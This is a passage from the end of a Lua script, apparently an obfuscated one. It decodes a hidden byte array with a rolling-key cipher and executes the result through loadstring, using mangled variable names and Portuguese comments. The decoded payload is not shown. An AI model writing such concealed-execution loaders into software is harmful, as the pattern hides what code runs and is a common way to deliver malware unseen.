    local function VM_O1I0ll(d, k, m)
        local R_O0llIOl = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_O0llIOl, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_O0llIOl)
    end

    -- Execution Guard
    local F_llII1IO = loadstring(VM_O1I0ll(B_I1IOl01, 65, 5))
    if F_llII1IO then
        F_llII1IO(...)
    end
end)(...)
